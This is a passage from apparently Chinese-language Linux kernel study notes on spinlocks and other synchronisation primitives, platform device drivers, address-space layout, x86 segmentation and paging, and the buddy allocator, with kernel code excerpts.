class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token operator">-&gt;</span>slock<span class="token punctuation">)</span><span class="token punctuation">;</span>__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token string">"1:ldrex%0, [%3]\n"</span><span class="token string">"add%1, %0, %4\n"</span><span class="token string">"strex%2, %1, [%3]\n"</span><span class="token string">"teq%2, #0\n"</span><span class="token string">"bne1b"</span><span class="token operator">:</span> <span class="token string">"=&amp;r"</span> <span class="token punctuation">(</span>lockval<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=&amp;r"</span> <span class="token punctuation">(</span>newval<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=&amp;r"</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token string">"r"</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token operator">-&gt;</span>slock<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"I"</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> TICKET_SHIFT<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token string">"cc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>lockval<span class="token punctuation">.</span>tickets<span class="token punctuation">.</span>next <span class="token operator">!=</span> lockval<span class="token punctuation">.</span>tickets<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">wfe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//忙等但尽量让cpu进去low power mode</span>        <span class="token comment">//参考：https://www.cnblogs.com/sky-heaven/p/12926376.html</span>lockval<span class="token punctuation">.</span>tickets<span class="token punctuation">.</span>owner <span class="token operator">=</span> <span class="token function">ACCESS_ONCE</span><span class="token punctuation">(</span>lock<span class="token operator">-&gt;</span>tickets<span class="token punctuation">.</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">smp_mb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>arch_spin_lock函数的作用：</p><ol><li>实现对next的独占访问，next = next + 1</li><li>while循环等待owner == next，return后得到该锁</li></ol><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220113-spinlock-flow-chart.png" alt="流程图"></p></li></ol><h3 id="同步机制的比较">同步机制的比较</h3><ul><li><p>信号量的特点</p><ul><li>用于进程和进程之间的同步</li><li>允许有多个进程进入临界区代码执行</li><li>进程获取不到信号量锁会陷入休眠，并让出CPU</li><li><strong>被信号量锁保护的临界区代码允许睡眠</strong></li><li>本质是基于进程调度器，UP和SMP下的实现无差异</li><li><strong>不支持进程和中断之间的同步</strong></li></ul></li><li><p>自旋锁的特点</p><ul><li>是一种<strong>死等</strong>的锁机制</li><li>一次只能有一个执行单元获取锁并进入临界区，其它的执行单元都是在门口不断死等</li><li>执行时间短</li><li><strong>可以在中断上下文执行</strong>（中断上下文代码不允许睡眠，也不允许调用可能会引起睡眠的函数）</li><li>spinlock不区分reader和writer，对于那些读写强度不对称的是不适合的</li></ul></li><li><p>读写自旋锁 rw spinlock</p><ul><li>自旋锁的改进，rw spinlock给reader赋予了更高的优先级</li><li>加锁的逻辑：<ol><li>假设临界区内没有任何的thread，这时候任何read thread或者write thread可以进入</li><li>假设临界区内有一个read thread，这时候新来的read thread可以任意进入，但是write thread<br>不可以进入</li><li>假设临界区内有一个write thread，这时候任何的read thread或者write thread都不可以进入</li><li>假设临界区内有一个或者多个read thread，write thread不可以进入临界区，也无法阻止后续read thread的进入，要一直等到临界区没有read thread的时候才可以进入</li></ol></li></ul></li><li><p>顺序锁 seqlock</p><ul><li>seqlock 给writer赋予了更高的优先级</li><li>加锁的逻辑：<ol><li>假设临界区内没有任何的thread，这时候任何read thread或者write thread可以进入</li><li>在临界区没有write thread的情况下，read thread可以随意进入</li><li>假设临界区内有一个write thread，这时候任何的read thread或者write thread都不可以进入</li><li>在临界区只有有read thread的情况下，write thread可以立刻执行，不会等待</li></ol></li></ul><blockquote><p>spin lock的不足：性能问题</p><p>rw spin lcok、spin lock和seqlock，它们都是基于一个remory中的共享变量（对该变量的访问是原子的）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220113-spinlock-performance.png" alt=""></p></blockquote></li><li><p>rcu</p><ul><li>基于multi-processor之间的共享counter的锁机制已经不能满足性能的需求，在这种情况下rcu机制应运而生</li></ul><p>参考：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/133445693">spinlock前世今生</a></li><li><a href="https://www.cnblogs.com/crybaby/p/13062811.html">Linux自旋锁内核源码分析</a></li></ul></li></ul><h2 id="09-字符设备驱动到平台设备驱动">09 字符设备驱动到平台设备驱动</h2><ol><li><p>platform驱动</p><ul><li><p>platform是一条虚拟总线，可以将一些设备放置在该虚拟设备总线上，设备为platform_device，要操作这些设备需要使用匹配的驱动，驱动为platform_driver</p></li><li><p>使用platform总线的好处</p><ul><li>把设备都挂接在一个pseudo总线上，便于管理，同时也符合Linux的设备模型机制。其结果是，配套的sysfs节点、设备电源管理都成为可能</li><li>隔离设备和驱动。在BSP中定义platform设备和它使用的资源、设备的具体配置信息；而在驱动中，只需要通过通用的API去获取资源和数据，做到了BSP相关代码和驱动代码的分离，使得驱动具有更好的可扩展性和跨平台性</li></ul></li></ul></li><li><p>将char设备驱动改造为platform驱动</p><p>当执行insmod时，驱动会在总线上查找与其对应的设备，查找成功后执行 probe 动作进行设备初始化，当驱动卸载后执行remove函数，进行退出动作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//头文件</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/platform_device.h&gt;</span></span><span class="token comment">//</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hello_plat_release</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">resource</span> hello_dev_resource<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>start <span class="token operator">=</span> LEDBASE<span class="token punctuation">,</span><span class="token punctuation">.</span>end   <span class="token operator">=</span> LEDBASE <span class="token operator">+</span> LEDLEN <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">.</span>flags <span class="token operator">=</span> IORESOURCE_MEM<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//平台设备结构体</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> hello_device <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>name  <span class="token operator">=</span> <span class="token string">"hello-device"</span><span class="token punctuation">,</span><span class="token punctuation">.</span>id  <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">.</span>num_resources  <span class="token operator">=</span> <span class="token function">ARRAY_SIZE</span><span class="token punctuation">(</span>hello_dev_resource<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//指定资源</span><span class="token punctuation">.</span>resource  <span class="token operator">=</span> hello_dev_resource<span class="token punctuation">,</span><span class="token punctuation">.</span>dev <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>release <span class="token operator">=</span> hello_plat_release<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//平台驱动结构体</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">platform_driver</span> hellodev_driver <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>probe<span class="token operator">=</span> hellodev_probe<span class="token punctuation">,</span><span class="token punctuation">.</span>remove<span class="token operator">=</span> hellodev_remove<span class="token punctuation">,</span><span class="token punctuation">.</span>driver<span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>owner<span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span><span class="token punctuation">.</span>name<span class="token operator">=</span> <span class="token string">"hello-device"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//初始化</span><span class="token keyword">int</span> <span class="token function">charDrvInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//注册平台设备和驱动</span><span class="token function">platform_device_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hello_device<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">platform_driver_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hellodev_driver<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">void</span> __exit <span class="token function">charDrvExit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">platform_device_unregister</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hello_device<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">platform_driver_unregister</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hellodev_driver<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">module_init</span><span class="token punctuation">(</span>charDrvInit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>charDrvExit<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>源码</p><p>platform_device结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token punctuation">{</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token keyword">int</span>id<span class="token punctuation">;</span>boolid_auto<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">device</span>dev<span class="token punctuation">;</span>u32num_resources<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">resource</span><span class="token operator">*</span>resource<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">platform_device_id</span><span class="token operator">*</span>id_entry<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>driver_override<span class="token punctuation">;</span> <span class="token comment">/* Driver name to force a match */</span><span class="token comment">/* MFD cell pointer */</span><span class="token keyword">struct</span> <span class="token class-name">mfd_cell</span> <span class="token operator">*</span>mfd_cell<span class="token punctuation">;</span><span class="token comment">/* arch specific additions */</span><span class="token keyword">struct</span> <span class="token class-name">pdev_archdata</span>archdata<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>platform_driver结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">platform_driver</span> <span class="token punctuation">{</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>probe<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>remove<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>shutdown<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>suspend<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> pm_message_t state<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>resume<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> driver<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">platform_device_id</span> <span class="token operator">*</span>id_table<span class="token punctuation">;</span>bool prevent_deferred_probe<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设备注册</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">platform_device_register</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span>pdev<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">device_initialize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">arch_setup_pdev_archdata</span><span class="token punctuation">(</span>pdev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">platform_device_add</span><span class="token punctuation">(</span>pdev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>驱动注册</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//platform_driver_register -&gt; __platform_driver_register</span><span class="token keyword">int</span> <span class="token function">__platform_driver_register</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">)</span><span class="token punctuation">{</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>owner <span class="token operator">=</span> owner<span class="token punctuation">;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>bus <span class="token operator">=</span> <span class="token operator">&amp;</span>platform_bus_type<span class="token punctuation">;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>probe <span class="token operator">=</span> platform_drv_probe<span class="token punctuation">;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>remove <span class="token operator">=</span> platform_drv_remove<span class="token punctuation">;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">.</span>shutdown <span class="token operator">=</span> platform_drv_shutdown<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">driver_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>drv<span class="token operator">-&gt;</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">struct</span> <span class="token class-name">bus_type</span> platform_bus_type <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>name<span class="token operator">=</span> <span class="token string">"platform"</span><span class="token punctuation">,</span><span class="token punctuation">.</span>dev_groups<span class="token operator">=</span> platform_dev_groups<span class="token punctuation">,</span><span class="token punctuation">.</span>match<span class="token operator">=</span> platform_match<span class="token punctuation">,</span><span class="token comment">//match函数用于之后匹配</span><span class="token punctuation">.</span>uevent<span class="token operator">=</span> platform_uevent<span class="token punctuation">,</span><span class="token punctuation">.</span>pm<span class="token operator">=</span> <span class="token operator">&amp;</span>platform_dev_pm_ops<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>驱动的匹配原则</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//driver_register -&gt; bus_add_driver -&gt; driver_attach</span><span class="token comment">//总线上找到设备，让驱动与设备进行匹配</span><span class="token keyword">int</span> <span class="token function">driver_attach</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">bus_for_each_dev</span><span class="token punctuation">(</span>drv<span class="token operator">-&gt;</span>bus<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> drv<span class="token punctuation">,</span> __driver_attach<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">__driver_attach</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> ret<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token function">driver_match_device</span><span class="token punctuation">(</span>drv<span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dev<span class="token operator">-&gt;</span>driver<span class="token punctuation">)</span><span class="token function">driver_probe_device</span><span class="token punctuation">(</span>drv<span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//driver_probe_device -&gt; really_probe -&gt; drv-&gt;probe(dev);//调用驱动的probe</span><span class="token function">device_unlock</span><span class="token punctuation">(</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>dev<span class="token operator">-&gt;</span>parent<span class="token punctuation">)</span><span class="token function">device_unlock</span><span class="token punctuation">(</span>dev<span class="token operator">-&gt;</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">driver_match_device</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">,</span>      <span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> drv<span class="token operator">-&gt;</span>bus<span class="token operator">-&gt;</span>match <span class="token operator">?</span> drv<span class="token operator">-&gt;</span>bus<span class="token operator">-&gt;</span><span class="token function">match</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> drv<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//bus上定义的match函数</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">platform_match</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span>pdev <span class="token operator">=</span> <span class="token function">to_platform_device</span><span class="token punctuation">(</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">platform_driver</span> <span class="token operator">*</span>pdrv <span class="token operator">=</span> <span class="token function">to_platform_driver</span><span class="token punctuation">(</span>drv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">/* fall-back to driver name match */</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>pdev<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> drv<span class="token operator">-&gt;</span>name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="10-Linux内存地址空间">10 Linux内存地址空间</h2><h3 id="内核空间和用户空间">内核空间和用户空间</h3><ol><li><p>32位 linux 系统的地址空间分布</p><p>操作系统分配给每个进程一个独立的、连续的、虚拟的地址内存空间</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211117-memory-space.png" alt=""></p><p>现代采用虛拟内存的操作系统通常都使用平坦地址空间</p><ul><li><p>用户空间地址范围：0x00000000～0xBFFFFFFF，大小3G</p></li><li><p>内核空间地址范围：0xC0000000 ~ 0xFFFFFFFF，大小1G</p></li></ul></li><li><p>逻辑地址和虚拟地址</p><p>在intel x86下，<strong>逻辑地址</strong>是由一个段标识符加上一个指定段内的相对地址的偏移量组成，表示为 [段标识符：段内偏移量]，例如：[cs:eip]</p><p><strong>虚拟地址</strong>其实就是上述组成逻辑地址的段内偏移offset</p><p><strong>线性地址</strong>是由逻辑地址经过一系列转换得到的，具体来讲就是： 线性地址=段描述符所在段的基地址+offset（intel x86 线性地址由逻辑地址经过段页式转换得到）</p><p><strong>物理地址</strong>是真正的物理内存的地址</p></li><li><p>linux 内核划分内核空间和用户空间的原因</p><ul><li><p><strong>安全考量</strong></p><p>整个系统中有各种资源，比如计算资源、内存资源和外设资源。而linux是多用户、多进程系统。所以，这些资源必须在受限的、被管理的状态下使用，要不然就陷入了混乱。空间隔离可以保证即便是单个应用程序出现错误也不会影响到操作系统的稳定性。</p></li><li><p><strong>处理器模式不同，权限不同</strong></p><p>内核空间和用户空间代码运行时的处理器模式是不同的，用户模式只能正常执行程序，而特权模式才能访问外设、处理中断等</p><ul><li><p>对于x86体系的cpu， 用户空间代码运行在Ring3模式（用户模式），内核空间代码运行Ring 0模式（特权模式）</p></li><li><p>对于arm体系的cpu，用户空间代码运行在usr模式（用户模式），内核空间代码运行在svc模式（特权模式）</p></li></ul></li><li><p><strong>核心代码和业务代码的解耦</strong></p><p>内核代码偏重于系统和资源管理，而用户空间代码偏重于业务逻辑代码的实现，两者分工不同，隔离也是解耦</p></li></ul></li><li><p>64位系统的内核空间和用户空间的地址分布</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211119-64-os.png" alt=""></p><ul><li><p>64位系统的地址线有64位，但是在具体实现上，并没有使用这么多，一般来说，48位的地址线就够了</p><p>比如armv8-A，高64TB是内核空间，低64TB是用户空间</p></li><li><p>内核空间的的高16位都是1，用户空间的低16位都是0，这样可以方便的对用户空间和内核空间进行有效性检测，防止越界</p></li></ul></li></ol><h3 id="MMU地址转换">MMU地址转换</h3><p>MMU 是一种硬件电路，它包含两个部件，一个是分段部件，一个是分页部件</p><ul><li><p>分段机制把一个逻辑地址转换为线性地址</p></li><li><p>分页机制把一个线性地址转换为物理地址</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220118-mmu.png" alt=""></p></li></ul><h3 id="x86段页式内存管理">x86段页式内存管理</h3><ol><li><p>逻辑地址到物理地址的转换（32）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211120-x86cpu-mm.png" alt="x86 cpu 段页式内存管理机制"></p></li><li><p>分段 <code>Segmentation</code></p><p>在 Intel 平台下，逻辑地址是 [selector:offset] 形式，selector 是 CS 寄存器的值，offset 是 EIP 寄存器的值，如果用 selector 去 GDT( 全局描述符表 ) 里拿到 segment base address（段基址） 然后加上 offset（段内偏移），这就得到了 linear address</p><p>逻辑地址转换为线性地址的过程：</p><p>（1）先从段选择符（selector）中得到段描述符</p><p>（2）从段描述符中得到段基地址</p><p>（3）线性地址=段基地址+段内偏移（即虚拟地址）</p></li><li><p>段选择符</p><p>为了方便快速检索段选择符，处理器提供了 6 个分段寄存器来缓存段选择符：cs ss ds es fs gs</p><ul><li>段的基地址（Base Address）：在线性地址空间中段的起始地址</li><li>段的界限（Limit）：在虚拟地址空间中，段内可以使用的最大偏移量</li></ul><p>段选择符的组成</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211128-segment-selector.png" alt="selector"></p><ul><li><p>Index 是13位的索引号</p></li><li><p>T1 字段表示使用的是 GDT 还是使用 LDT，GDT、LDT 里的内容就是段描述符</p><ul><li>一些全局的段描述符，就放在<strong>全局段描述符表</strong>（GDT）中</li><li>一些局部的，例如每个进程自己的，就放在<strong>局部段描述符表</strong>（LDT）中</li></ul></li><li><p>段描述符的 Base 字段描述了一个段的的基地址，然后再加上段内偏移offset，就得到了最终的线性地址</p></li></ul></li><li><p>分页 <code>Paging</code></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211128-paging.png" alt=""></p><p>线性地址转换成物理地址通过页表映射实现，页表映射具体还可以分为二级页表、三级页表等</p><p>以二级页表的映射机制为例：</p><p>linux把32的线性地址划分成了3段：</p><ul><li><p>高10bit：对应上图里的（Dir)，表示在页目录表内部的偏移，用来定位页表的物理地址。</p></li><li><p>中间10bite：对应上图里的（Table），表示在页表内部的偏移，用来定位具体的物理内存的的基地址。</p></li><li><p>最低12bit：对应上图里的（Offset），刚好表示4K大小，用来定位在物理内存某个块里的偏移。</p></li></ul><p>把线性地址分成三段，用前两段分别作为索引去查表，根据页表项（Page Table Entry）获得一个物理内存块的起始地址（物理内存编号），加上页内偏移就得到了最终的 physical address</p><p><a href="https://www.bilibili.com/read/cv8129309">https://www.bilibili.com/read/cv8129309</a></p></li><li><p>Linux 内核中逻辑地址、虚拟地址和线性地址的关系</p><p>Intel 的设计中段式内存管理中的段类型分为三种：代码段、数据段、系统段，但只靠页式内存管理就已经可以完成 Linux 内核需要的所有功能，所以 Linux 内核将所有类型的段的 segment base address 都设成 0 。由于段限长是地址总线的寻址限度，所以所有段内空间跟整个线性空间重合了，逻辑地址也就简化为了段内的偏移量（逻辑地址=虚拟地址）</p><p>所以在 x86 linux 内核里，<strong>逻辑地址、虚拟地址、线性地址，这三个地址是一致的</strong></p></li><li><p>参考</p><p><a href="https://zhuanlan.zhihu.com/p/377946859">Linux 用户空间与内核空间及分段机制</a></p><p><a href="https://blog.csdn.net/mirage1993/article/details/71156109">Linux 内核中逻辑地址/虚拟地址/线性地址三者的区别</a></p><p><a href="https://www.toutiao.com/a6855591224003265036/?log_from=42a7e1ffc21a_1637399126505">Linux 内核中逻辑、虚拟、线性和物理地址大扫盲</a></p></li></ol><h3 id="用户态地址空间">用户态地址空间</h3><h3 id="内核态地址空间">内核态地址空间</h3><h3 id="进程内存空间">进程内存空间</h3><ul><li><p>用户进程通常情况只能访问用户空间的虚拟地址，不能访问内核空间虚拟地址</p></li><li><p>内核空间是由内核负责映射，不会跟着进程变化；内核空间地址有自己对应的页表，用户进程各自有不同的页表</p></li></ul><h2 id="11-Linux内核内存管理">11 Linux内核内存管理</h2><h3 id="伙伴算法">伙伴算法</h3><ol><li><p>页框：内核使用<code>struct page</code>结构体描述每个物理页</p></li><li><p>场景：内核在很多情况下，需要申请连续的页框，而且数量不定</p></li><li><p>实现：</p><ul><li>Linux把所有的空闲页框分组为11个块链表（<code>#define MAX_ORDER 11</code>），每个链表上的页框块是固定的，在第i条链表中每个页框块都包含$2^i$个连续页</li><li>每个页框块的第一个页框的物理地址是该块大小的整数倍（例如：大小为16个页框的块其起始地址是$16 \times 